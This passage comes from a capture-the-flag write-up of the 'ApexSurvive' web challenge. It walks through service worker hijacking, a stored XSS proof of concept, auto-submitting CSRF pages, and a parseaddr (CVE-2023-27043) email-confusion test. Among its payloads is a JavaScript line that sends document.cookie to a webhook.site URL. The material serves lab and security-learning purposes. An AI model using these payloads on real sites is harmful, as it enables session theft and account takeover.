+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">version</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;version&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">importScripts</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/workbox-cdn/releases/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">version</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/workbox-sw.js`</span>);
+</span></span></code></pre></div><p>The <code>host</code> and <code>version</code> variables are passed to <code>sw.js</code> to determine which version of Google&rsquo;s Workbox (some Google Service Worker script that helps with caching and other stuff) to import using <code>importScripts</code>.</p>
+<p>Importantly, <code>host</code> and <code>version</code> are extracted as the text contents of two hidden DOM elements based on their ID <code>#serviceWorkerHost</code> and <code>#serviceWorkerVersion</code> respectively.</p>
+<p>If we can inject an element with one of these IDs, we will be able to <strong>hijack</strong> the service worker path leading to XSS.</p>
+<p>To do that, let&rsquo;s look for DOM sinks within our HTML templates, luckily we identify two such instances:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># _navbar.html</span>
+</span></span><span style="display:flex;"><span>&lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/challenge/settings&#34;</span>&gt;Account Settings <span style="color:#f92672">({{</span> user<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">]</span> | safe <span style="color:#f92672">}})</span>&lt;/a&gt;&lt;/li&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># product.html</span>
+</span></span><span style="display:flex;"><span>let note <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#f92672">{{</span> product.note | safe <span style="color:#f92672">}}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>const clean <span style="color:#f92672">=</span> DOMPurify.sanitize<span style="color:#f92672">(</span>note, <span style="color:#f92672">{</span>FORBID_ATTR: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;id&#39;</span>, <span style="color:#e6db74">&#39;style&#39;</span><span style="color:#f92672">]</span>, USE_PROFILES: <span style="color:#f92672">{</span>html:true<span style="color:#f92672">}})</span>;
+</span></span></code></pre></div><blockquote>
+<p>In Jinja2, Flask&rsquo;s templating engine, the <code>safe</code> attribute does not <strong>make</strong> a value safe; instead, it is used to <strong>declare</strong> a value as such, essentially telling Jinja2 to not escape the value since it is &ldquo;already safe&rdquo;. - me</p>
+</blockquote>
+<p>We do not have access to the <code>addItem</code> functionality, this eliminates the second option.</p>
+<p>We are left with the username sink, and thankfully we are authorized to modify our profile settings. Additionally, the <code>bleach</code> whitelist allows us to use an <code>id</code> attribute within an <code>a</code> tag!</p>
+<ol>
+<li>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/sw-hijacking-1.png"></p>
+</li>
+<li>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/sw-hijacking-2.png"></p>
+</li>
+</ol>
+<p>Our hypothesis was correct. We were able to control the <code>host</code> parameter and hijack the load path from the default <code>https://storage.googleapis.com</code> to our own non-existing <code>HIJACKEDSCRIPT</code> host.</p>
+<p>This attack is described <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers">here</a> as <em>Service Worker Hijacking via DOM Clobbering</em> and is a method to achieve XSS.</p>
+<p>This attack remains impossible unless we find a way to make the bot visit our own profile page.</p>
+<p>Essentially, for this attack to succeed, we must get the bot to login, then make him visit the now-his malicious page populated with our Service Worker payload, but even then, he would lose his high-privileged token upon login, so the whole attack sequence is pointless, let alone feasible.</p>
+<p><strong>References:</strong></p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API">https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerContainer/register">https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerContainer/register</a></li>
+</ul>
+<h3 id="stored-xss-in-productnote">Stored XSS in <code>product.note</code><a href="#stored-xss-in-productnote" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>A convenient characteristic in white-box testing is that you can research vulnerabilities in paths inaccessible to you, before reaching them.</p>
+<p>Here is a good example of that: we can try to exploit the <code>{{ product.note | safe }}</code> XSS DOM sink, discovered in the previous attempt, even though we have not found a way to make it reachable yet.</p>
+<p>A quick, local proof-of-concept:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;1&#34;</span>)}<span style="color:#e6db74">` //
+</span></span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-proof.png"></p>
+<p>Since the cookie had <code>HttpOnly: false</code>, we could theoretically exfiltrate the cookie of anyone who visits the product page with a similar payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://webhook.site/REDACTED/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>))}<span style="color:#e6db74">` //
+</span></span></span></code></pre></div><p>We will keep this in our pocket, maybe we will need it.</p>
+<h3 id="cross-side-request-forgery">Cross Side Request Forgery<a href="#cross-side-request-forgery" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Okay, we are unable to steal the bot&rsquo;s cookie due to Same-origin Policy (SOP) imposed by the cookie&rsquo;s <code>SameSite</code> restriction, but we still got the bot to visit our attacker-controlled page, that&rsquo;s big, right?</p>
+<p>Can we instruct the bot to do requests on our behalf?</p>
+<p>We will serve the following page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- login to our profile --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://83.136.253.226:33120/challenge/api/login&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>
+</span></span><span style="display:flex;"><span>    &gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test@email.htb&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>      document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>When the bot visits our weaponized page, a form will be submitted on his behalf, essentially logging him on to our account.</p>
+<p>But similar to our last discussion on Service Worker Hijacking, we cannot control the bot beyond login.</p>
+<p>Could we incite the bot to insert an XSS payload into the products page? Let&rsquo;s try:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://94.237.60.74:35743/challenge/api/addItem&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>
+</span></span><span style="display:flex;"><span>    &gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flower&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;price&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$9.99&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;CSRF added product...&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imageURL&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.cakedeco.com/390562.gif&#34;</span>
+</span></span><span style="display:flex;"><span>      /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;note&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;${alert(&#39;1&#39;)}` //&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;seller&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aelmo&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>      document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>This - obviously - did not work, first because of <code>@antiCSRF</code> which requires us to have the user&rsquo;s <code>antiCSRFToken</code> before we can submit the form, but even if we were to leak the <code>antiCSRFToken</code> somehow, the <code>SameSite: Strict</code> cookie restriction will prevent the browser from passing the cookie (even though the form&rsquo;s target is the cookie&rsquo;s issuing origin), because the request initiating origin is different.</p>
+<p>Another attempt that I have tried, was attempting to fetch one of the site&rsquo;s pages using a basic GET request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://94.237.60.74:35743/challenge/home&#34;</span>, {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span>,
+</span></span><span style="display:flex;"><span>        }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>) =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>      })();
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>The request succeeded, you could see the response in the Network tab; however, Cross-origin Resource Sharing would prevent Javascript from reading the HTML response since that target does not provide relevant HTTP headers such as <code>Access-Control-Allow-Origin</code>.</p>
+<p>Additionally, something like <code>credentials: include</code> would not work because, as it turns out, it requires <code>Access-Control-Allow-Origin</code> to be present <em>and</em> not be set to a wildcard <code>*</code> origin.</p>
+<blockquote>
+<p>&ldquo;You can also use Cross-origin resource sharing (CORS) to relax the SOP. CORS protects the data of the requested server. It allows servers to explicitly specify the list of origins that are allowed via the Access-Control-Allow-Origin header. The origin of the page sending the request is then checked against this list of allowed origins.&rdquo; - <a href="https://medium.com/swlh/hacking-the-same-origin-policy-f9f49ad592fc">reference</a></p>
+</blockquote>
+<p><strong>References:</strong></p>
+<ul>
+<li><a href="https://stackoverflow.com/questions/12630231/how-do-cors-and-access-control-allow-headers-work">https://stackoverflow.com/questions/12630231/how-do-cors-and-access-control-allow-headers-work</a></li>
+<li><a href="https://stackoverflow.com/questions/43262121/trying-to-use-fetch-and-pass-in-mode-no-cors">https://stackoverflow.com/questions/43262121/trying-to-use-fetch-and-pass-in-mode-no-cors</a></li>
+<li><a href="https://medium.com/swlh/hacking-the-same-origin-policy-f9f49ad592fc">https://medium.com/swlh/hacking-the-same-origin-policy-f9f49ad592fc</a></li>
+<li><a href="https://thesecurityvault.com/understanding-cors-and-sop-bypass-techniques/">https://thesecurityvault.com/understanding-cors-and-sop-bypass-techniques/</a></li>
+</ul>
+<h3 id="honorable-mentions">Honorable Mentions<a href="#honorable-mentions" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><code>uuidv4</code> tokens are relied on throughout the app to generate confirmation tokens and CSRF tokens. Could we abuse this somehow to perform &ldquo;UUIDv4 prediction&rdquo;?</p>
+<p>Short answer is: no.</p>
+<p>The <code>query</code> call in <code>/login</code> was the only one to include an <code>f''</code> literal along the <code>%s</code> prepared statement placeholders, could this be exploited somehow?</p>
+<pre tabindex="0"><code class="language-pthon" data-lang="pthon">user = query(f&#39;SELECT * FROM users WHERE email=%s OR unconfirmedEmail=%s AND password=%s&#39;, (email, email, password, ) ,one=True)
+</code></pre><p>Short answer is: no.</p>
+<h2 id="chapter-5-internal-clarity">Chapter 5: Internal Clarity<a href="#chapter-5-internal-clarity" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>After so many failed attempts at elevating our privileges, we decide to establish the facts acquired so far:</p>
+<ol>
+<li>We have an <strong>Open Redirect</strong> at <code>/challenge/external</code></li>
+<li>We have a <strong>stored XSS</strong> on <code>/challenge/product/&lt;id&gt;</code></li>
+<li>We are theoretically able to chain the <strong>Open Redirect</strong> and <strong>stored XSS</strong> to perform <strong>session hijacking</strong> of the bot&rsquo;s admin session.</li>
+<li>Admin seems to have some interesting file write capability (<code>/addContract</code>) which might help us obtain <strong>RCE</strong> somehow.</li>
+</ol>
+<p>That&rsquo;s our theorized attack path; however, we are unable to kick start it because it requires the <code>isInternal</code> privilege to perform step 1.</p>
+<p>Let&rsquo;s visualize our attack chain so far:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-incomplete.png"></p>
+<p>This nicely illustrates what we discussed earlier about white-box testing where we might find an entire attack chain, while the chain&rsquo;s entry point is yet inaccessible to us.</p>
+<p>Let&rsquo;s focus on gaining the <code>isInternal</code> privilege since everything seems to depend on it. How do we get <code>isInternal</code>?</p>
+<p>A <code>Ctrl+Shift+F</code> (underrated tool) in the codebase for <code>isInternal</code> shows us the <em>only</em> function in the app that sets <code>isInternal</code> to <code>true</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verifyEmail</span>(token):
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> query(<span style="color:#e6db74">&#39;SELECT * from users WHERE confirmToken = </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (token, ), one<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user <span style="color:#f92672">and</span> user[<span style="color:#e6db74">&#39;isConfirmed&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;unverified&#39;</span>:
+</span></span><span style="display:flex;"><span>        _, hostname <span style="color:#f92672">=</span> parseaddr(user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>])[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hostname <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;apexsurvive.htb&#39;</span>:
+</span></span><span style="display:flex;"><span>            query(<span style="color:#e6db74">&#39;UPDATE users SET isConfirmed=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, email=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, unconfirmedEmail=&#34;&#34;, confirmToken=&#34;&#34;, isInternal=&#34;true&#34; WHERE id=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (<span style="color:#e6db74">&#39;verified&#39;</span>, user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>], user[<span style="color:#e6db74">&#39;id&#39;</span>],))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            query(<span style="color:#e6db74">&#39;UPDATE users SET isConfirmed=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, email=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, unconfirmedEmail=&#34;&#34;, confirmToken=&#34;&#34; WHERE id=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (<span style="color:#e6db74">&#39;verified&#39;</span>, user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>], user[<span style="color:#e6db74">&#39;id&#39;</span>],))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        mysql<span style="color:#f92672">.</span>connection<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span></code></pre></div><p><code>database.py/verifyEmail</code> is the function responsible for verifying our emails.</p>
+<p>However, <code>verifyEmail</code> contains an interesting condition: if an email is within the <code>apexsurvive.htb</code> domain, it is considered to be internal and is given the <code>isInternal</code> privilege upon verification.</p>
+<p>A quick check shows us that we actually can register any email we want. There is no checks on registration or even profile updates, which mimics a real-life application; however, just like in real applications, we would be unable to verify our arbitrarily-picked email since we do not have access to its inbox.</p>
+<p>That&rsquo;s literally why we have email verification, to prove ownership of a claimed email.</p>
+<h3 id="parseaddr-and-rfc2822">parseaddr and RFC2822<a href="#parseaddr-and-rfc2822" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>I suspected the <code>parseaddr</code> function was involved, since its output was the primary arbiter of the hostname. The whole check was based on <code>parseaddr</code>&rsquo;s output.</p>
+<p>A quick search yielded very interesting stuff on a recent <code>parseaddr</code> vulnerability that could result in an authentication bypass, <strong>CVE-2023-27043</strong>:</p>
+<p>The CVE reads:</p>
+<blockquote>
+<p>&ldquo;The email module of Python through 3.11.3 incorrectly parses e-mail addresses that contain a special character. The wrong portion of an RFC2822 header is identified as the value of the addr-spec. In some applications, an attacker can bypass a protection mechanism in which application access is granted only after verifying receipt of e-mail to a specific domain (e.g., only @company.example.com addresses may be used for signup). This occurs in email/_parseaddr.py in recent versions of Python.&rdquo;</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27043">https://nvd.nist.gov/vuln/detail/CVE-2023-27043</a></li>
+</ul>
+</blockquote>
+<p>Our docker instance is running Alpine <code>3.14.1</code> which has <code>Python 3.9.17</code>, confirming that <code>parseaddr</code> most likely is vulnerable.</p>
+<p>The vulnerability says that if we control the address&rsquo; realname, we get to control the hostname.</p>
+<p>For example: <code>alice@example.org)&lt;bob@example.org&gt;</code> evaluates to <code>alice@example.org</code> when parsed, even though it should evaluate to <code>bob@example.org</code> according to the RFC2822.</p>
+<p>My hypothesis was that I might be able to leverage a disparity between <code>parseaddr</code>&rsquo;s evaluated hostname and the <code>flask-mail/MailHog</code> send functionality.</p>
+<p>I wrote a simple checker to test things out:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> email.utils <span style="color:#f92672">import</span> parseaddr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>regex <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">checkEmail</span>(email):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (re<span style="color:#f92672">.</span>fullmatch(regex, email)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>        email <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        pa <span style="color:#f92672">=</span> parseaddr(email)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;parseaddr res:&#39;</span>, pa)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        _, hostname <span style="color:#f92672">=</span> parseaddr(email)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">==================&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;regex&#39;</span>, <span style="color:#e6db74">&#39;passed&#39;</span> <span style="color:#66d9ef">if</span> checkEmail(email) <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;did NOT pass&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;parse result:&#39;</span>, (_, hostname))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;hostname:&#39;</span>, hostname)
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ check.py <span style="color:#e6db74">&#39;hacker@apexsurvive.htb]&lt;test@email.htb&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>parseaddr res: <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;hacker@apexsurvive.htb&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># a compliant parser should return this:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (&#39;hacker@apexsurvive.htb]&#39;, &#39;test@email.htb&#39;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># according to RFC2822</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================</span>
+</span></span><span style="display:flex;"><span>regex did NOT pass
+</span></span><span style="display:flex;"><span>parse result: <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;hacker&#39;</span>, <span style="color:#e6db74">&#39;apexsurvive.htb&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>hostname: apexsurvive.htb
+</span></span></code></pre></div><p>While the idea is not so bad in essence - according to unbiased me 😅 - it ended up failing for many reasons:</p>
+<ul>
+<li>Further research showed that <code>flask-mail</code>, <code>smtplib</code> and Python&rsquo;s <code>MailHog</code> all make use of <code>parseaddr</code> under the hood, so they all share the parsing discrepancy.</li>
+<li><code>@sanitizeInput</code> would escape <code>&lt; &gt;</code> required in this parsing vulnerability anyways.</li>
+<li>The <code>checkEmail</code> regex-based check would prevent address manipulation anyways.</li>
+</ul>
+<p>Original CPython issue:</p>
+<ul>
+<li><a href="https://github.com/python/cpython/issues/102988">https://github.com/python/cpython/issues/102988</a></li>
+</ul>
+<p>Interesting reads on why RFC2822 implementations can be prone to mistakes (Hint: it&rsquo;s pretty complex):</p>
+<ul>
+<li><a href="https://www.rfc-editor.org/rfc/rfc2822#section-3.4">https://www.rfc-editor.org/rfc/rfc2822#section-3.4</a></li>
+<li><a href="https://pdw.ex-parrot.com/Mail-RFC822-Address.html">https://pdw.ex-parrot.com/Mail-RFC822-Address.html</a></li>
+<li><a href="https://www.codeproject.com/Articles/5260174/Email-address-validation-explained-in-detail-code">https://www.codeproject.com/Articles/5260174/Email-address-validation-explained-in-detail-code</a></li>
+</ul>
+<h3 id="a-race-condition">A Race Condition?<a href="#a-race-condition" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>While I found some fun in reading RFC2822 and <code>addr-spec</code> BNF, it led to no results.</p>
